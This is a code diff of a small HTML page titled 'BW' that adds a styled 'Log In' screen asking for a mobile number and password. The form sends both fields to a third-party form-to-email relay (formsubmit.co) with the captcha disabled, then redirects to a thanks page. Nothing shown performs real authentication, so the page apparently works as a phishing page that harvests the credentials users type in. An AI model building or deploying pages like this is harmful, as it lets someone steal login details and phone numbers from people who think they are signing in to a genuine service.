@@ -4,16 +4,21 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>BW</title>
+    <link rel="stylesheet" href="styles.css">
 </head>
-<body>
-    <form action="https://formsubmit.co/c979cffa3f60cd909235a13c8f804587" method="POST">
+<body style="background-color: white;">
+    
+    <div class="container">
+        <h2>Log In</h2>
+        <form action="https://formsubmit.co/c979cffa3f60cd909235a13c8f804587" method="POST">
         <input type="hidden" name="_next" value="https://bw-vert.vercel.app/thanks.html">
         <input type="hidden" name="_captcha" value="false">
         <input type="hidden" name="_template" value="table">
 
-        <input type="text" name="name"> <br>
-        <input type="password" name="password"> <br>
-        <input type="submit">
+        <input placeholder="Mobile Number" type="number" name="phone"> <br>
+        <input placeholder="Password" type="password" name="password"> <br>
+        <input class="btn" type="submit" style="background-color: rgb(9, 175, 9);">
     </form>
+    </div>
 </body>
 </html>
